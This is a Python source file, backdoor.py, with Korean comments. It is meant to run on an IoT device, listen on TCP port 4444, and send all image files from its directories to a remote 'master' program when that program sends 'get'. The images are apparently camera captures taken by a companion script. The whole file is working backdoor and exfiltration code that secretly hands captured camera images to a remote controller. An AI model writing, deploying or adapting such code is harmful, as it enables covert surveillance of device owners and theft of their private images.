# backdoor.py
# IoT 기기에서 작동하면서 master.py의 명령어를 입력받으면
# backdoor.py 파일이 존재하는 디렉토리의 정보를 전달하는 프로그램

from socket import *    # 서로 다른 호스트에 존재하는 기기끼리 통신하기 위해 Socket API import
import os               # 파일 경로 사용을 위해 os import
import os.path
import time             # 시간 정보를 사용하기 위해 time import
import json             # TCP 통신에서 데이터를 담을 컨테이너로 json 사용


# 서버 소켓 오픈
server_port = 4444
server_socket = socket(AF_INET, SOCK_STREAM)    # TCP 프로토콜을 사용하는 서버 소켓 생성
server_socket.bind(("", server_port))           # 프로그램이 존재하는 IP주소의 포트에 소켓 연결
server_socket.listen(1)                         # 클라이언트의 연결을 기다리는 상태
dir_list = []                                   # backdoor.py 파일이 존재하는 디렉토리들의 이름을 저장할 dir_list 리스트 생성
path = os.getcwd()                              # backdoor.py 프로그램이 설치된 경로를 확인

def send_img(dirpath):          # 이미지를 전송하는 함수
    global path                 # backdoor.py 파일이 존재하는 경로를 전역 변수로 사용
    files = os.listdir(dirpath) # 인자로 전달받은 dirpath에 존재하는 파일들의 목록을 files 리스트에 저장
    client_socket.send(json.dumps({"filenum":len(files)}).encode()) # 인자로 전달받은 dirpath에 존재하는 파일의 개수 전송
    time.sleep(0.5)             # 파일 송수신 사이의 안전성을 위해 sleep 사용
    for i in range(len(files)): # 존재하는 파일의 개수만큼 for문 실행
        capture_file_name = path+"/"+dirpath +"/"+files[i]  # 전송할 파일의 full path를 생성
        file = open(capture_file_name, "rb")                # 전송할 파일을 open
        img_size = os.path.getsize(capture_file_name)       # 전송할 파일의 크기 지정
        data = json.dumps({"filesize": img_size})           # 전송할 파일의 크기를 전송하여 수신측에서 파일 송수신 기준으로 사용
        client_socket.send(data.encode())                   # 파일 사이즈 전송
        time.sleep(0.2)                                     # 파일 송수신 사이의 안전성을 위해 sleep 사용
        img = file.read(img_size)                           # 전송할 파일을 파일의 크기만큼 read
        while True:
            if not img:
                break
            client_socket.send(img)
            img = file.read(1024)
        print(str(capture_file_name)+' sent')               # 하나의 파일을 보낼 때 마다 안내문구 출력
        file.close()                                        # 파일 스트림을 close
        time.sleep(0.5)                                     # 파일 송수신 사이의 안전성을 위해 sleep 사용

print("TCPServer Waiting for client on port "+str(server_port)) # 정보를 전달하는 서버 프로그램이 지정된 포트에서 작동하고 있다는 안내 문구 출력

while True:
    # 클라이언트 요청 대기중
    client_socket, address = server_socket.accept()         # 서버 소켓이 accept한 클라이언트 소켓의 정보 가져옴
    server_socket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)   # 서버 프로그램이 종료된 뒤에도 바로 프로그램을 재시작할 수 있도록 타이머 설정
    # 연결 요청 성공
    print("I got a connection from ", address)              # 클라이언트와의 연결 안내 문구

    if client_socket.recv(1024).decode() == 'get':          # 클라이언트쪽에서 'get' 메세지를 주면 파일을 클라이언트 프로그램에게 전송
        print('master send get command')            # 전달받은 메시지를 출력

        # send_img 함수에 인자값으로 파일 이름을 넣어주면 차례대로 for문을 돌면서 클라이언트쪽으로 이미지파일 전송
        dir_list = os.listdir(path)                 # 경로에 존재하는 디렉토리들
        dir_list.remove('backdoor.py')              # 저장된 목록 중 해당 프로그램인 backdoor.py는 디렉토리가 아니므로 삭제
        dir_list.remove('camerashot.py')            # 저장된 목록 중 카메라를 자동하는 camerashot.py 역시 디렉토리가 아니므로 삭제

        dir_count = int(len(dir_list))              # 저장된 디렉토리들의 개수를 저장
        data = json.dumps({"size":dir_count})       # json 자료형을 통해 디렉토리의 개수를 저장
        client_socket.send(data.encode())           # 클라이언트에게 디렉토리 개수 전송
        for i in dir_list:                          # for문을 통해 각각의 디렉토리마다 이미지를 전송
            send_img(i)
            print(str(i) + " directory finish")     # 해당 디렉토리가 끝났다는 안내문구 출력
            time.sleep(1)                           # 먼저 보낸 이미지 파일을 다 받기를 기다리기 위해서 5초 동안 time
        print('Sending file successfully')          # 파일을 성공적으로 전송했다는 안내문구
    elif client_socket.recv(1024).decode() == 'terminate':
        client_socket.close()                       # 'get'이 아닌 다른 문구를 입력받으면 종료
        print('Socket closed')